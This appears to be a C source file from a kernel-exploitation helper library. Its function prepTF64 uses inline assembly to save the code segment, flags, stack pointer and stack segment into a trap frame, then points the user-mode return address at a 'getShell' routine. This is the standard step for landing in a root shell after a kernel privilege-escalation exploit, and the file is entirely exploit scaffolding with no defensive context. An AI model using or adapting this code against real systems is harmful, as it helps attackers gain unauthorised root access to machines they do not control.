#include <stdio.h>
#include <stdint.h>
#include "../fitz.h"

void prepTF64(uint64_t *user_rip, _Bool verbose) {
    if (verbose)
        puts("Generating TrapFrame...");

    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
        );
    *user_rip = getShell;
}